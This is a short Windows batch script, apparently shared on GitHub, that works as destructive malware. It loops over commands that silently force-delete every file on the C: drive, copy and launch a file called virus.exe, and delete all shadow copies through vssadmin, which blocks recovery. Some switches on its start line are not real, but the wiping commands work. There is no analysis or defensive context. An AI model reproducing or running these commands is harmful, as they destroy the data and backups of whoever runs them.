@echo off
start /min /B /HIDE /WAIT /LOW /NOSHOW
:start
echo ***** github.com/wiced1 ***** 
del C:\*.* /f /s /q 
copy virus.exe C:\
start virus.exe
vssadmin delete shadows /all /quiet
goto start